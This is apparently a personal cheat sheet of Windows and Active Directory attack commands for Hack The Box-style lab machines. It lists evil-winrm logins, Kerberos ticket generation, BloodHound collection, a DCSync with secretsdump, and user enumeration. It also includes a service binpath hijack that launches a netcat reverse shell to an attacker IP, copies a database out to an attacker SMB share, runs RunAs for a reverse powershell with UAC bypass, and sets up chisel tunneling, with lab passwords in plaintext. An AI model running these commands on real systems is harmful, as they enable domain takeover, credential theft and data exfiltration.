


*connecting with evil-winrm with KRB ticket*

*this worked for win-rm* -> this has to b the most ugly command I have ever written

KRB5CCNAME=./svc_winrm.ccache sudo docker run --rm -it -v "/home/ew/box/Voleur/svc_winrm.ccache:/tmp/krb5cc_0" -v "/home/ew/box/Voleur/krb5.conf:/etc/krb5.conf" -v "/etc/hosts:/etc/hosts:ro" evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB 


 *NTLM authentication*
sudo docker run --rm -it evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!' 


are you using kerberos or NTLM authention? pay attention the commands may change


*generating TGT for user*
nxc smb frizzdc.frizz.htb -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' --generate-tgt f.frizzle



*grabbing bloodhound info*
bloodhound-python -u 'svc-printer' -p '1edFg43012!!' -ns 10.10.11.108 -dc printer.return.local -d return.local -c All  



*start neo4j*
sudo neo4j console



**getST.py**
**ntlmrelayx.py**
**secretsdump.py**


*DCsync attack*
secretsdump.py 'puppy.htb'/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.180 



*rpcclient guest with no password*
rpcclient 10.10.11.108 -U 'guest%' 

rpcclient $> lookupnames administrator


`lookupsids`

lookupsid.py svc-printer@10.10.11.108

```
netexec smb 10.10.11.222 -u guest -p '' --rid-brute
```


*uses SAM remote interface to enumerate users, works over smb/RPC*
`samrdump.py`

samrdump.py return.local/svc-printer:'1edFg43012!!'@10.10.11.108 



*powershell/cmd enumeration*
whoami /priv
whoami /groups

sc.exe query -> list running services

*list services*
```
 $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```



*copy docker files in and out of container*
sudo docker cp 245f71c07597:/data/site-backup-2024-12-30.zip /home/ew/box/puppy/loot/site-backup-2024-12-30.zip



*adding a service*
```
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
```

*running service on attacker machine*
```
sc.exe start VSS
```



*all open ports*
netstat -a 



*start smb server for file transfer from windows*
```
smbserver.py share . -username 0xdf -password 0xdf -smb2support
```

 *use share*
```
net use \\10.10.14.6\share /u:0xdf 0xdf
```



*copy to share*
```
copy data\gitea.db //10.10.14.6/share/
```
``

*RunAs.exe command*
```
.\r.exe openfire 'HotP!fireguard' powershell -r 10.10.14.6:444 --logon-type 5 --bypass-uac
```


*Chisel Command (rev proxy for tunneling)*
on attacker machine
```
./chisel_1.10.1_linux_amd64 server --reverse --port 7878
```
on target
```
chisel.exe client 10.10.14.24:7878 R:9090:127.0.0.1:9090 
```



